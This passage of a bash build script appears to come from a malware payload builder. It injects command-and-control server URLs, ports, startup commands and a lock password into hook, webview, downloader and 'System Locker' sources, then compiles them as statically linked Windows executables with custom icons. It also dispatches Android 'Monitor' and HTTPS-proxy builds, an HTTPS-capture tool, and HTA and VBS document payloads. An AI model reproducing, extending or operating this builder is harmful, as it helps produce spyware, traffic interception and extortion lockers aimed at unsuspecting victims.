                    if [ -n "$REMOTE_SERVER_URL" ]; then
                        replace_var "$source_file" "remote_server_url" "$REMOTE_SERVER_URL" "cpp_string"
                    fi
                    
                    if [ -n "$REMOTE_SERVER_PORT" ]; then
                        replace_var "$source_file" "remote_server_port" "$REMOTE_SERVER_PORT" "cpp_num"
                    fi
                    ;;
                webview_pen3.cpp)
                    # Update launch mode, show popup, startup command, and server URL if provided
                    if [ -n "$LAUNCH_MODE" ]; then
                        replace_var "$source_file" "LAUNCH_MODE" "$LAUNCH_MODE" "cpp_num"
                    fi
                    
                    if [ -n "$SHOW_POPUP" ]; then
                        replace_var "$source_file" "SHOW_POPUP" "$SHOW_POPUP" "cpp_bool"
                    fi
                    
                    if [ -n "$STARTUP_COMMAND" ]; then
                        replace_var "$source_file" "STARTUP_COMMAND" "$STARTUP_COMMAND" "cpp_string"
                    fi
                    
                    if [ -n "$SERVER_URL" ]; then
                        replace_var "$source_file" "SERVER_URL" "$SERVER_URL" "cpp_string"
                    fi
                    ;;
                download.cpp)
                    # Update server URL if provided
                    if [ -n "$SERVER_URL" ]; then
                        sed -i "s|std::string url = \"http://[^\"]*\"|std::string url = \"http://$SERVER_URL\"|g" "$source_file"
                    fi
                    ;;
                MegaClient.java|GameClient.java)
                    # Update server URL if provided
                    if [ -n "$SERVER_URL" ]; then
                        replace_var "$source_file" "SERVER_URL" "$SERVER_URL" "java_string"
                    fi
                    ;;
                syslock.cpp)
                    # Update password if provided
                    if [ -n "$OUTPUT_NAME" ]; then
                        sed -i "s/#define PASSWORD L\"[^\"]*\"/#define PASSWORD L\"$OUTPUT_NAME\"/g" "$source_file"
                    fi
                    ;;
            esac
            
            # Set output name if not provided
            if [ -z "$OUTPUT_NAME" ]; then
                case "$source_type" in
                    hook.c|hook2.c|hook3.c|hook4.c)
                        output_name="$PC_HOOK_NAME"
                        ;;
                    webview_pen.cpp|webview_pen2.cpp|webview_pen3.cpp)
                        output_name="$PC_WEBVIEW_NAME"
                        ;;
                    download.cpp)
                        output_name="$PC_DOWNLOADER_NAME"
                        ;;
                    MegaClient.java)
                        output_name="$PC_JAVA_NAME"
                        ;;
                    GameClient.java)
                        output_name="$PC_JAVA_GAME_NAME"
                        ;;
                    syslock.cpp)
                        output_name="$PC_LOCKER_NAME"
                        ;;
                esac
            else
                output_name="$OUTPUT_NAME"
            fi
            
            # Handle icon
            res_file=""
            if [ -n "$ICON_PATH" ]; then
                if [ -f "$ICON_PATH" ]; then
                    res_file=$(create_icon_resource "$ICON_PATH")
                    if [ $? -ne 0 ]; then
                        echo "Warning: Failed to create icon resource"
                        res_file=""
                    fi
                else
                    echo "Warning: Icon file not found: $ICON_PATH"
                fi
            fi
            
            # Build based on platform and source type
            case "$PLATFORM" in
                windows)
                    case "$source_type" in
                        hook.c|hook2.c|hook3.c|hook4.c)
                            compile_cmd="x86_64-w64-mingw32-gcc -o ${output_name}.exe ${source_file} \
                              -lws2_32 -liphlpapi -lwlanapi -lsetupapi -lpowrprof -lwinmm \
                              -lole32 -lpsapi -luser32 -lgdi32 -ladvapi32 -lshell32 \
                              -loleaut32 -lcomctl32 -lwinspool -limm32 -lmsimg32 -lversion \
                              -lcomdlg32 -lshlwapi -lstrmiids -lwtsapi32 -pthread -mwindows -static -luuid -ldxva2 -lwinhttp -lurlmon"
                            ;;
                        webview_pen.cpp|webview_pen2.cpp|webview_pen3.cpp)
                            compile_cmd="x86_64-w64-mingw32-g++ -std=c++17 -DWEBVIEW_EDGE=1 \
-I./webview/include -I./webview2_sdk/build/native/include \
-I$HOME/mingw-libs/include \
-I/usr/x86_64-w64-mingw32/include \
-I$HOME/mingw-libs/include/opencv4 \
-I/usr/x86_64-w64-mingw32/include/gdiplus \
${source_file} -mwindows -o ${output_name}.exe \
-L$HOME/mingw-libs/lib/webview/WebView2LoaderStatic \
-L$HOME/mingw-libs-static/lib \
-L$HOME/mingw-libs/lib \
-L$HOME/mingw-libs/lib64 \
-L$HOME/mingw-libs/lib/opencv4/3rdparty \
-lopencv_world4130 \
-llibopenjp2 -lIlmImf -lade -llibprotobuf \
-llibwebp -llibjpeg-turbo -llibpng -llibtiff -lzlib \
-lpthread -lssl -lcrypto \
-lwinhttp -lbthprops -lportaudio -lwinmm \
-luser32 -lgdi32 -lcomdlg32 -lole32 -loleaut32 -luuid -lversion \
-lshlwapi -lurlmon -lgdiplus -lsetupapi -lksuser -lmswsock -liphlpapi -lws2_32 -limm32 \
-static-libgcc -static-libstdc++ -static -lwinpthread \
-D_WIN32 -D_WIN32_WINNT=0x0600 -DWIN32_LEAN_AND_MEAN"
                            ;;
                        download.cpp)
                            compile_cmd="x86_64-w64-mingw32-g++ download.cpp -o ${output_name} \
                              -lwininet -lole32 -lshell32 \
                              -static-libgcc -static-libstdc++"
                            ;;
                        MegaClient.java|GameClient.java)
                            cd "$PC_DIR/java/$source_type"
                            compile_cmd="javac ${source_file} && jar cfm ${output_name}.jar manifest.txt *.class"
                            ;;
                        syslock.cpp)
                            compile_cmd="x86_64-w64-mingw32-g++ -g -o ${output_name}.exe syslock.cpp -mwindows -lshlwapi -lshell32 -ladvapi32 -lgdi32 -luser32 -lkernel32 -static -DUNICODE -D_UNICODE"
                            ;;
                    esac
                    
                    if [ -n "$res_file" ]; then
                        compile_cmd="$compile_cmd $res_file"
                    fi
                    
                    if run_with_spinner "$compile_cmd"; then
                        mkdir -p "$OUTPUT_DIR"
                        if [[ "$source_type" == *.java ]]; then
                            cp -f "${output_name}.jar" "$OUTPUT_DIR/"
                            echo "Build complete! ${output_name}.jar created for Windows"
                            echo "> Output saved to: $OUTPUT_DIR/${output_name}.jar"
                        else
                            cp -f "${output_name}.exe" "$OUTPUT_DIR/"
                            echo "Build complete! ${output_name}.exe created for Windows"
                            echo "> Output saved to: $OUTPUT_DIR/${output_name}.exe"
                        fi
                    else
                        handle_error "Build failed!"
                    fi
                    ;;
                linux)
                    case "$source_type" in
                        hook.c)
                            if [ "$source_file" = "hook2.c" ]; then
                                compile_cmd="gcc -o ${output_name} ${source_file} -lpthread -ldl -lX11 -lXtst -lasound -lcurl \`pkg-config --cflags --libs opencv4\` \`pkg-config --cflags --libs gtk+-3.0\`"
                            elif [ "$source_file" = "hook4.c" ]; then
                                compile_cmd="gcc -o ${output_name} ${source_file} -I/home/zeus/MASH -lpthread -ldl -lX11 -lXtst -lasound -lcurl \`pkg-config --cflags --libs opencv4\` \`pkg-config --cflags --libs gtk+-3.0\`"
                            else
                                compile_cmd="gcc -o ${output_name} ${source_file} -lpthread -ldl -lX11 -lXtst -lasound \`pkg-config --cflags --libs opencv4\` \`pkg-config --cflags --libs gtk+-3.0\`"
                            fi
                            ;;
                        webview_pen.cpp|webview_pen2.cpp|webview_pen3.cpp)
                            compile_cmd="g++ -o ${output_name} ${source_file} \
                              -std=c++17 \
                              -I./opencv_fix \
                              -I/usr/include/opencv4 \
                              -L/usr/lib/x86_64-linux-gnu \
                              -lopencv_core -lopencv_imgproc -lopencv_imgcodecs -lopencv_highgui -lopencv_videoio \
                              -lbluetooth \
                              -lportaudio \
                              -lssl -lcrypto \
                              -lpthread \
                              -lX11 -lXtst \
                              -lboost_system \
                              -lboost_thread \
                              -I./webview/include -I./webview2_sdk/build/native/include \
                              \`pkg-config --cflags --libs gtk+-3.0 webkit2gtk-4.1 libcurl\`"
                            ;;
                        download.cpp)
                            compile_cmd="g++ -o ${output_name} download.cpp"
                            ;;
                        MegaClient.java|GameClient.java)
                            cd "$PC_DIR/java/$source_type"
                            compile_cmd="javac ${source_file} && jar cfm ${output_name}.jar manifest.txt *.class"
                            ;;
                        syslock.cpp)
                            echo "Error: System Locker is Windows-only"
                            exit 1
                            ;;
                    esac
                    
                    if run_with_spinner "$compile_cmd"; then
                        mkdir -p "$OUTPUT_DIR"
                        if [[ "$source_type" == *.java ]]; then
                            cp -f "${output_name}.jar" "$OUTPUT_DIR/"
                            echo "Build complete! ${output_name}.jar created for Linux"
                            echo "> Output saved to: $OUTPUT_DIR/${output_name}.jar"
                        else
                            cp -f "${output_name}" "$OUTPUT_DIR/"
                            echo "Build complete! ${output_name} created for Linux"
                            echo "> Output saved to: $OUTPUT_DIR/${output_name}"
                        fi
                    else
                        handle_error "Build failed!"
                    fi
                    ;;
                *)
                    echo "Error: Invalid platform: $PLATFORM"
                    exit 1
                    ;;
            esac
            
            # Clean up temporary files
            if [ -n "$res_file" ]; then
                rm -f "$res_file" "${res_file%.res}.rc" "${res_file%.res}.ico"
            fi
            ;;
        android)
            if [ -z "$ANDROID_TYPE" ]; then
                echo "Error: Android type not specified"
                show_usage
                exit 1
            fi
            
            # Call the appropriate Android project configuration
            case "$ANDROID_TYPE" in
                Monitor)
                    configure_android_project "Monitor"
                    ;;
                Monitor2)
                    configure_android_project "Monitor2"
                    ;;
                Monitor3)
                    configure_android_project "Monitor3"
                    ;;
                HTTPSProxy)
                    configure_android_project "HTTPSProxy"
                    ;;
                *)
                    echo "Error: Invalid Android type: $ANDROID_TYPE"
                    show_usage
                    exit 1
                    ;;
            esac
            ;;
        cross)
            if [ -z "$CROSS_TYPE" ]; then
                echo "Error: Cross-platform type not specified"
                show_usage
                exit 1
            fi
            
            case "$CROSS_TYPE" in
                https-capture)
                    build_https_capture
                    ;;
                *)
                    echo "Error: Invalid cross-platform type: $CROSS_TYPE"
                    show_usage
                    exit 1
                    ;;
            esac
            ;;
        doc)
            if [ -z "$DOC_TYPE" ]; then
                echo "Error: Document type not specified"
                show_usage
                exit 1
            fi
            
            case "$DOC_TYPE" in
                hta)
                    build_hta_payload
                    ;;
                vbs)
                    build_vbs_payload
                    ;;
                *)
                    echo "Error: Invalid document type: $DOC_TYPE"
                    show_usage
                    exit 1
                    ;;
            esac
            ;;
        *)
            echo "Error: No payload type specified"
            show_usage
            exit 1
            ;;
    esac
    
    exit 0
fi

# Start the main menu if no arguments are provided
main_menu
